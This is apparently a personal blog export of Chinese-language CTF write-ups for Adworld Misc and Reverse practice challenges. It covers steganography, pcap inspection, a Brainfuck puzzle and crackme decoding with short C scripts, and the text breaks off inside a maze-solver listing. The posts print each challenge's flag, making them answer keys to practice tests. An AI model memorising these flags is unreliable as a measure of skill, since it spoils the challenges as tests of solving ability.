[{"title":"Adworld Misc Writeups","url":"/2025/01/11/Adworld-Misc-writeups/","content":"记录Adworld Misc的个人writeups.\n\nBanmabanma解压附件得到斑马斑马.png.\n\n显然, 这是一个条形码, 要使用专门的工具来识别.\n把图片扔到Barcode Reader,\n\nFlag: flag&#123;TENSHINE&#125;\n\n适合作为桌面解压附件得到1.png\n\n图像隐写, 先上StegSolve.\n发现Red plane 1藏了一张二维码:\n\n解码得到如下文本:\n03F30D0A79CB05586300000000000000000100000040000000730D0000006400008400005A000064010053280200000063000000000300000016000000430000007378000000640100640200640300640400640500640600640700640300640800640900640A00640600640B00640A00640700640800640C00640C00640D00640E00640900640F006716007D00006410007D0100781E007C0000445D16007D02007C01007400007C0200830100377D0100715500577C010047486400005328110000004E6966000000696C00000069610000006967000000697B000000693300000069380000006935000000693700000069300000006932000000693400000069310000006965000000697D000000740000000028010000007403000000636872280300000074030000007374727404000000666C6167740100000069280000000028000000007304000000312E7079520300000001000000730A0000000001480106010D0114014E280100000052030000002800000000280000000028000000007304000000312E707974080000003C6D6F64756C653E010000007300000000\n\n编写脚本, 把十六进制字符串转换为文本:\n# 1.txt是存放十六进制字符串的文件with open(&quot;1.txt&quot;, &quot;r&quot;) as f:    hex_str = f.read()byte_stream = bytes.fromhex(hex_str)with open(&quot;2.txt&quot;, &quot;wb&quot;) as f:    f.write(byte_stream)\n\n得到的2.txt并非纯文本文件, 用file命令判断文件类型:\nfile 2.txt\n\n是个pyc文件, 用python2运行了一下, 什么输出都没有, 意料之中.\n使用在线工具反编译:\n#!/usr/bin/env python# visit https://tool.lu/pyc/ for more information# Version: Python 2.7def flag():    str = [        102,        108,        97,        103,        123,        51,        56,        97,        53,        55,        48,        51,        50,        48,        56,        53,        52,        52,        49,        101,        55,        125]    flag = &#x27;&#x27;    for i in str:        flag += chr(i)        print flag\n\n还好没再套一层Crypto, 调用flag()就能拿到flag了.\nFlag: flag&#123;38a57032085441e7&#125;\n这题难度只有1? 本萌新瑟瑟发抖.\n\n心仪的公司解压附件得到webshell.pcapng.\n看来是道流量审计题.\n看到那一堆包就头大, 决定先用strings看看有没有什么好玩的字符串.\nstrings webshell.pcapng | grep &#123;\n\n没想到, 直接就秒了?\nFlag: fl4g:&#123;ftop_Is_Waiting_4_y&#125;\n\npure_color附件就是一张图. (以下并非空白界面, 真的有一张白色的图. 建议在Dark Mode下阅读此writeup)\n\n上StegSolve.\n切换到Blue plane 0:\n\n这…对吗? 感觉像是假flag啊.\n而且还有语法错误.\n但提交通过了, 确实是这个flag.\nFlag: flag&#123;true_steganographers_doesnt_need_any_tools&#125;\n\n2017_Dating_in_Singapore题目描述:\n01081522291516170310172431-050607132027262728-0102030209162330-02091623020310090910172423-02010814222930-0605041118252627-0203040310172431-0102030108152229151617-04050604111825181920-0108152229303124171003-261912052028211407-04051213192625\n\n解压附件得Year 2017 Calendar – Singapore.pdf:\n\n第一眼, 感觉非常诡异:\n\n这些乱七八糟的数字是什么意思?\n给我一张日历干啥?\n\n但再仔细观察就可以发现, 这些数字被-划分为12组, 每组的数字个数都是偶数, 且如果按两位来读取数字, 这些数字的范围在01~31之间.\n也就是说, 这些数字很可能代表日期, 第k组表示第k月.\n在日历上找出这些日期, 发现是字符画:\n\nFlag: HITB&#123;CTFFUN&#125;\n\nsimple_transfer解压附件得到一个pcap文件.\n和心仪的公司一样, 先strings查一下字符串, 没查出来.\n打开wireshark分析流量, 发现全是TCP协议.\n\n实在不想(其实是不会)分析这堆流量包, 既然查不到明文, 且结合题目名, 这些流量里很可能藏有文件.\n直接foremost分离. (binwalk也行, 但binwalk似乎会把PDF文件再往下拆分, 这里用foremost更优.)\n\nFlag: HITB&#123;b3d0e380e9c39352c667307d010775ca&#125;\n\nTraining-Stegano-1附件是一张只有102B的bmp图片, 4x4像素.\n用010 Editor看看.\n\n密码是steganoI. 这个是什么的密码?\n印象中没见过bmp的文件嵌入, 且这个文件大小不可能是密文或者文件嵌入, 试着直接提交steganoI, 显示正确.\nFlag: steganoI\n\ncan_has_stdio?解压附件得到文件misc50.\n没有后缀, 用file命令确定文件类型:\n\n既然是个文本, 那就直接cat看看.\n\n                                                                                                                                                                                                  +                                                                            ++                                                                            +++                                                                          ++[&gt;                                                                          +&gt;++&gt;                                                                        +++&gt;++                                                                        ++&gt;++++                                                                      +&gt;++++++                                                                      &gt;+++++++&gt;                                                                    ++++++++&gt;+                                                                    ++++++++&gt;++                                                                  ++++++++&gt;+++                                                                  ++++++++&gt;++++                                           ++++++++&gt;+++++++++++++&gt;++++++++++++++&gt;+++++++++++++++&gt;++                        ++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;--.++&lt;&lt;                            &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;----.++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;                                &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+.-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-.+&lt;                                    &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+++.---&lt;&lt;&lt;&lt;&lt;&lt;                                        &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;---.+++&lt;&lt;&lt;&lt;&lt;&lt;&lt;                                            &lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+++.---&lt;&lt;&lt;&lt;&lt;                                                &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-.+&lt;&lt;                                                    &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;                                                      &gt;&gt;----.++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;                                                      &lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+.-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;                                                     &lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;--.++&lt;&lt;&lt;                                                    &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-.                                                   +&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;                                                  +++.---&lt;&lt;&lt;&lt;&lt;&lt;   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;                                                 &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-.+&lt;       &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;                                                &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;           &gt;&gt;&gt;--.++&lt;                                               &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;               &lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;                                              &gt;&gt;&gt;&gt;&gt;&gt;                    &gt;&gt;&gt;-.+                                             &lt;&lt;&lt;&lt;&lt;                        &lt;&lt;&lt;&lt;&lt;                                            &lt;&lt;&lt;                            &lt;&gt;&gt;                                           &gt;&gt;                                &gt;&gt;                                                                                                                                                                                                                                                                &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;++.--&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-.+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;--.++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;---.+++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;--.++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-.+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+.-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;--.++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;----.++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-.+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;++.--&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;-.+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;--.++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;+.-&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;----.++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;---.+++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;.\n\n随便找个Brainfuck解释器, 复制粘贴即可拿到flag.\nFlag: flag&#123;esolangs_for_fun_and_profit&#125;\n\nErik-Baleog-and-Olaf (TODO)解压附件得到文件stego100, 用file确定是PNG文件:\n\n我先用010 Editor看看文件尾有没有藏东西:\n\nhttp://i.imgur.com/22kUrzm.png\n\n访问这个URL, 来到这样一个网站:\n\nemmm, 没看出这个hint到底是啥意思, 先把这个网页放一边, 用StegSolve看看.\n在Green plane 1下, 可以看到中间有一个二维码:\n\n但右下角未能完整显示, 扫不出来.\n在Random colour map 1/2/3反复刷, 也还是扫不出来, 难崩.\n","categories":["CTF"],"tags":["Misc","Adworld"]},{"title":"Adworld Re Writeups","url":"/2025/01/26/Adworld-Re-Writeups/","content":"Reversing-x64Elf-100下载附件得到.re文件.\n先用DIE看看是什么文件:\n\n然后再扔进IDA:\n\n重点是这个sub_4006FD函数:\n\n根本不需要分析, 直接打印*(char *)(i + a1)就行.\nexp:\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;__int64 __fastcall sub_4006FD(__int64 a1){  int i; // [rsp+14h] [rbp-24h]  __int64 v3[4]; // [rsp+18h] [rbp-20h]  v3[0] = (__int64)\"Dufhbmf\";  v3[1] = (__int64)\"pG`imos\";  v3[2] = (__int64)\"ewUglpt\";  for ( i = 0; i &lt;= 11; ++i )  {  //  if ( *(char *)(v3[i % 3] + 2 * (i / 3)) - *(char *)(i + a1) != 1 )  //    return 1LL;        printf(\"%c\", *(char *)(v3[i % 3] + 2 * (i / 3)) - 1);  }  return 0LL;}int main(){    sub_4006FD(0LL);    return 0^(0-0)^0;}\n\nFlag: Code_Talkers\n\n666解压附件得到666文件.\nDIE:\n\nIDA:\n\nmain函数:\n\n\n\nencode函数:\n\n\n\nkey = 18, enFlag = izwhroz\"\"w\"v.K\".Ni\n\nencode是线性的, 而且只涉及简单的加减和异或, 直接逆就行了.\nexp:\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#define _BYTE char#define key 18int __fastcall encode(const char *a1, __int64 a2){  char v3[104]; // [rsp+10h] [rbp-70h]  int v4; // [rsp+78h] [rbp-8h]  int i; // [rsp+7Ch] [rbp-4h]  i = 0;  v4 = 0;  if ( strlen(a1) != key )    return puts(\"Your Length is Wrong\");  for ( i = 0; i &lt; key; i += 3 )  {/*    v3[i + 64] = key ^ (a1[i] + 6);    v3[i + 33] = (a1[i + 1] - 6) ^ key;    v3[i + 2] = a1[i + 2] ^ 6 ^ key;    *(_BYTE *)(a2 + i) = v3[i + 64];    *(_BYTE *)(a2 + i + 1LL) = v3[i + 33];    *(_BYTE *)(a2 + i + 2LL) = v3[i + 2];*/    // 等价于如下代码    *(_BYTE *)(a2 + i) = key ^ (a1[i] + 6);    *(_BYTE *)(a2 + i + 1LL) = (a1[i + 1] - 6) ^ key;    *(_BYTE *)(a2 + i + 2LL) = a1[i + 2] ^ 6 ^ key;  }  return a2;}void decode(char *a2){    char flag[104] = {0};     for(int i = 0; i &lt; key; i += 3){        flag[i] = (*(_BYTE *)(a2 + i) ^ key) - 6;        flag[i + 1] = (*(_BYTE *)(a2 + i + 1) ^ key) + 6;        flag[i + 2] = *(_BYTE *)(a2 + i + 2) ^ 6 ^ key;    }    printf(\"%s\\n\", flag);}int main(){    char s[] = \"izwhroz\\\"\\\"w\\\"v.K\\\".Ni\";    decode(s);    return 0^(0-0)^0;}\n\nFlag: unctf{b66_6b6_66b}\n\neasyRE1解压附件得到  个文件: easy-32和easy-64.\n两个文件扔到IDA里是几乎一样的:\n\n直接提交db2f62a36a018bce28e46d976e3f9864, 错误.\n对db2f62a36a018bce28e46d976e3f9864进行解密无果, 直接搜这个字符串才知道答案要包上flag{}…\n显然这是个签到题.\nFlag: flag{db2f62a36a018bce28e46d976e3f9864}\n\nlucknum解压附件得到lucknum文件.\nDIE:\n\nIDA:\n\n也是一道搞笑签到题.\nFlag: flag{c0ngr@tul@ti0n_f0r_luck_numb3r}\n\nreverse_re3\n解压附件得到main2文件.\nDIE:\n\nIDA:\n\n看到positive sp value has been detected.有点慌, 先切到main函数看看:\n\n重点是这个sub_940函数:\n__int64 sub_940(){  int v0; // eax  int v2; // [rsp+8h] [rbp-218h]  int v3; // [rsp+Ch] [rbp-214h]  char v4[520]; // [rsp+10h] [rbp-210h] BYREF  unsigned __int64 v5; // [rsp+218h] [rbp-8h]  v5 = __readfsqword(0x28u);  v3 = 0;  memset(v4, 0, 0x200uLL);  _isoc99_scanf(&amp;unk_1278, v4, v4);  while ( 1 )  {    do    {      v2 = 0;      sub_86C();      v0 = v4[v3];      if ( v0 == 100 ) // Coast的注释: d      {        v2 = sub_E23();      }      else if ( v0 &gt; 100 )      {        if ( v0 == 115 ) // Coast的注释: s        {          v2 = sub_C5A();        }        else if ( v0 == 119 ) // Coast的注释: w        {          v2 = sub_A92();        }      }      else      {        if ( v0 == 27 ) // Coast的注释: ESC          return 0xFFFFFFFFLL;        if ( v0 == 97 ) // Coast的注释: a          v2 = sub_FEC();      }      ++v3;    }    while ( v2 != 1 );    if ( dword_202AB0 == 2 )      break;    ++dword_202AB0;  }  puts(\"success! the flag is flag{md5(your input)}\");  return 1LL;}\n\n可以看出, 这应该是一个走迷宫程序, 再来看看sub_86C, sub_E23, sub_C5A, sub_A92, sub_FEC:\nsub_86Csub_E23sub_C5Asub_A92sub_FECunsigned __int64 sub_86C(){  int i; // [rsp+0h] [rbp-10h]  int j; // [rsp+4h] [rbp-Ch]  unsigned __int64 v3; // [rsp+8h] [rbp-8h]  v3 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 14; ++i )  {    for ( j = 0; j &lt;= 14; ++j )    {      if ( dword_202020[225 * dword_202AB0 + 15 * i + j] == 3 )      {        dword_202AB4 = i;        dword_202AB8 = j;        break;      }    }  }  return __readfsqword(0x28u) ^ v3;}__int64 sub_E23(){  if ( dword_202AB8 != 14 )  {    if ( dword_202020[225 * dword_202AB0 + 1 + 15 * dword_202AB4 + dword_202AB8] == 1 )    {      dword_202020[225 * dword_202AB0 + 1 + 15 * dword_202AB4 + dword_202AB8] = 3;      dword_202020[225 * dword_202AB0 + 15 * dword_202AB4 + dword_202AB8] = 1;    }    else if ( dword_202020[225 * dword_202AB0 + 1 + 15 * dword_202AB4 + dword_202AB8] == 4 )    {      return 1LL;    }  }  return 0LL;}__int64 sub_C5A(){  if ( dword_202AB4 != 14 )  {    if ( dword_202020[225 * dword_202AB0 + 15 + 15 * dword_202AB4 + dword_202AB8] == 1 )    {      dword_202020[225 * dword_202AB0 + 15 + 15 * dword_202AB4 + dword_202AB8] = 3;      dword_202020[225 * dword_202AB0 + 15 * dword_202AB4 + dword_202AB8] = 1;    }    else if ( dword_202020[225 * dword_202AB0 + 15 + 15 * dword_202AB4 + dword_202AB8] == 4 )    {      return 1LL;    }  }  return 0LL;}__int64 sub_A92(){  if ( dword_202AB4 )  {    if ( dword_202020[225 * dword_202AB0 - 15 + 15 * dword_202AB4 + dword_202AB8] == 1 )    {      dword_202020[225 * dword_202AB0 - 15 + 15 * dword_202AB4 + dword_202AB8] = 3;      dword_202020[225 * dword_202AB0 + 15 * dword_202AB4 + dword_202AB8] = 1;    }    else if ( dword_202020[225 * dword_202AB0 - 15 + 15 * dword_202AB4 + dword_202AB8] == 4 )    {      return 1LL;    }  }  return 0LL;}__int64 sub_FEC(){  if ( dword_202AB8 )  {    if ( dword_202020[225 * dword_202AB0 - 1 + 15 * dword_202AB4 + dword_202AB8] == 1 )    {      dword_202020[225 * dword_202AB0 - 1 + 15 * dword_202AB4 + dword_202AB8] = 3;      dword_202020[225 * dword_202AB0 + 15 * dword_202AB4 + dword_202AB8] = 1;    }    else if ( dword_202020[225 * dword_202AB0 - 1 + 15 * dword_202AB4 + dword_202AB8] == 4 )    {      return 1LL;    }  }  return 0LL;}\n\n合理猜测dword_202AB4是横坐标, dword_202AB8是纵坐标, dword_202020是地图, dword_202AB0目前还不知道是啥.\n看看dword_202020:\n\n选中这个区段的数据, 按快捷键shift + E即可导出数据. 注意要选择initialized C variables: DWORD是双节, 相当于unsigned long.\n\n    dword_202020 (25行27列) \n    \n      _DWORD dword_202020[675] = {    1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 3, 1, 1, 0,     0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1,    0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0,    1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0,    0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1,    0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0,    1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,    1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,    1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,    1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 3, 1, 1, 1, 1, 1, 0,    0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0,    0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0,    1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0,    0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1,    0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,    1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1,    1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0, 1, 1, 1, 1, 1,    1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 1, 1, 0, 0, 0, 0, 0, 0,    0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1,    1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,    0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0,    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,    0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,    1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0,     0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0,};\n\n    \n  \n\n通过坐标的上下限, 很容易得知地图的大小是 , 可是为什么dword_202020的大小是   呢?\n上面这几个函数都能看到类似dword_202020[225 * dword_202AB0 + 15 * i + j]的语句, 可以大胆猜测: dword_202020其实是保存了  个  的地图, 由dword_202AB0表示当前是第几个地图.\nsub_940的循环终止条件: if(dword_202AB0 == 2) break; ++dword_202AB0;证实了这个猜测.\n\n    dword_202020 (3 * 15 * 15) \n    \n      _DWORD dword_202020[3][15][15] = {    {        1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,         1, 1, 1, 1, 1, 0, 3, 1, 1, 0, 0, 0, 0, 0, 0,        1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0,        1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0,        1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0,        1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0,        1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0,        1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0,        1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0,        1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0,        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,    },    {        1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,        1, 1, 0, 3, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0,        1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0,        1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0,        1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0,        1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0,        1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0,        1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0,        1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0,        1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,        1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0,        1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0,        1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0,        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,    },    {        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,        0, 3, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,        0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0,        0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0,        0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,        0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,        0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,        0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,        0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0,        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0,        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0,        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0,    },};\n\n    \n  \n\n显然, 3代表起点, 4代表终点. 这里可以直接走, 但我还是写了个脚本来输出路线.\n反正不是比赛, 怎样优雅就怎样来.\nexp:\n#include &lt;queue&gt;#include &lt;cstdio&gt;#include &lt;windef.h&gt;DWORD dword_202020[3][15][15] = {    {        1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,         1, 1, 1, 1, 1, 0, 3, 1, 1, 0, 0, 0, 0, 0, 0,        1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0,        1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0,        1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0,        1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 